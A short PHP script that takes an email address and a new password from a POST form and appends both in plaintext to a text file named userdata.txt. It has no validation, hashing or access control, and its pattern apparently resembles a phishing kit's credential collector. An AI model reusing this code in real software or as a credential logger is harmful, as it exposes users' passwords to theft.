<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $email = $_POST["email"];
    $newPassword = $_POST["newPassword"];

    // Format data
    $data = "Email: $email\nNew Password: $newPassword\n\n";

    // Write data to file
    $file = fopen("userdata.txt", "a");
    fwrite($file, $data);
    fclose($file);

    echo "Form submitted successfully.";
} else {
    echo "Error: Form not submitted.";
}
?>
